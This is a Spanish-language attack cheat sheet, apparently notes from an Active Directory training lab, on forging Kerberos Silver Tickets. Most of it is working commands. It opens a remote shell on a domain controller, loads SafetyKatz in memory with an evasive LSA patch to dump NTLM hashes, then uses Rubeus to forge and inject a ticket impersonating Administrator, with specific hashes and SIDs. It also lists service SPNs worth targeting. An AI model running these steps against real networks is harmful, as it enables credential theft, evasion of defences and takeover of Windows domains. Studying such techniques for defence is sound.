# Silver Ticket  

Tags: #AD #Windows #Powershell #Rubeus 

```bash  
# Si tienes acceso a las credenciales de una cuenta de máquina, puedes reenviar (forward) silver tickets

- Un ticket de servicio válido o ticket TGS (el Golden Ticket es un TGT).
- Cifrado y firmado con el hash de la cuenta de servicio (el Golden Ticket está firmado con el hash de krbtgt) del servicio que se ejecuta con esa cuenta.
- Los servicios rara vez validan el PAC (Privileged Attribute Certificate).
- Los servicios permitirán acceso únicamente a sí mismos.
- Periodo de persistencia razonable (por defecto 30 días para cuentas de equipo).


# Servicios SPN definidos más comúnes en AD:
1 SPN: Cifs (SMB)
	- C$, ADMIN$
2 SPN: host
	- WMI
	- Scheduled Task 
	- RPC
3 SPN: http
4 SPN: mssql
	- xp_cmdshell 
5 SPN: ldap 
6 SPN: esman (Winrm) o rpcss
```

```powershell 
# Extracción 
! Usuario: Domain Admin o cuenta con acceso administrativo al DC

❯ winrs -r:dcorp-dc cmd
# Abrir una shell remota en el DC vía WinRM usando las credenciales actuales.

❯ .\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"
# Cargar SafetyKatz en memoria vía portforwarding y vuelcar hashes NTLM desde el DC — los hashes NTLM que muestra corresponden a los rc4 que se usan en Rubeus.

Nota
	- Cuando muestra los NTLM en esta ocasión son los rc4 que colocamos en el rubeus
```

## Rubeus 

```powershell 
! Usuario: Domain Admin (requiere hash NTLM del servicio objetivo y SID del dominio)

❯ .\Rubeus.exe silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:6e58e06e07588123319fe02feeab775d /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
# Forjar e inyectar un Silver Ticket para el servicio HTTP del DC impersonando a Administrator — /ldap consulta al DC para obtener atributos del usuario. Aplicable también a HOST, RPCSS, CIFS y otros servicios. 
	# El /service:SPN/MachineName.Domain.com
	# El /rc4:NTLM de DCORP-DC$

❯ .\Loader.exe -path C:\AD\Rubeus.exe -args evasive-silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:6e58e06e07588123319fe02feeab775d /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
# Cargar Rubeus en memoria vía Loader.exe y forjar el Silver Ticket en modo evasivo — inyecta el ticket directamente en el proceso actual.
	# El /service:SPN/MachineName.Domain.com
	# El /rc4:NTLM de DCORP-DC$

❯ .\Loader.exe -path C:\AD\Rubeus.exe -args klist
# Listar los tickets Kerberos activos en la sesión actual para verificar que el Silver Ticket fue inyectado correctamente.


Notes:
	1. Just like the Golden ticket, /ldap option queries DC for information related to the user.
	2. Similar command can be used for any other service on a machine. Which services? HOST, RPCSS, CIFS and many more.
```


![[Silver Attack 1.png]]